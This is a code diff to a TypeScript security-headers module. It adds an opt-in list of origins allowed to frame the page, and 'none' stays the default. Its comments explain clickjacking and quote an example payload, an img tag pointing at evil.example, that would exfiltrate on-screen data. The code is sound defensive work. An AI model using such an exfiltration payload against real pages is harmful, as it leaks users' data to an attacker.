@@ -92,6 +92,31 @@ export function checkRequest(
  * `<img src="https://evil.example/?d=...">` exfiltrates whatever is on screen the moment
  * it renders (§14). `form-action 'none'` closes the same hole for a submitted form.
  */
+/**
+ * Who, if anyone, may put this page in a frame.
+ *
+ * Module state rather than a parameter because `securityHeaders()` is called from five places,
+ * three of them error paths that have no access to the server's options — and a policy that is
+ * stricter on some responses than others is not a policy. Set once as the server starts.
+ */
+let frameAncestors: readonly string[] = []
+
+/**
+ * Names the origins allowed to embed this page. Empty is `'none'`, which is the default.
+ *
+ * Asked for by somebody working in JupyterLab, where the natural way to see a local app is inside
+ * the lab itself rather than in a separate tab — and an iframe is how that is done.
+ *
+ * **This is a real relaxation and it is opt-in for that reason.** `frame-ancestors` is what stops
+ * clickjacking: a hostile page embedding this one, overlaying it, and collecting a click that
+ * lands on an approval. The approval gate is precisely the thing being protected, so the answer is
+ * *named origins only* — never a wildcard, and never inferred from anything. Declared, not
+ * guessed, exactly as `--allow-host` is.
+ */
+export function setFrameAncestors(origins: readonly string[]): void {
+  frameAncestors = origins.map((origin) => origin.trim()).filter((origin) => origin.length > 0)
+}
+
 export function securityHeaders(): Record<string, string> {
   return {
     'Content-Security-Policy': [
@@ -103,7 +128,13 @@ export function securityHeaders(): Record<string, string> {
       "img-src 'self' data:",
       "font-src 'self'",
       "connect-src 'self'",
-      "frame-ancestors 'none'",
+      /*
+       * `'none'` unless somebody named an origin. A list here is a deliberate act by an operator
+       * who wants this page inside another — a lab, a dashboard — and it names exactly which.
+       */
+      frameAncestors.length === 0
+        ? "frame-ancestors 'none'"
+        : `frame-ancestors ${frameAncestors.join(' ')}`,
       "base-uri 'none'",
       "form-action 'none'",
     ].join('; '),
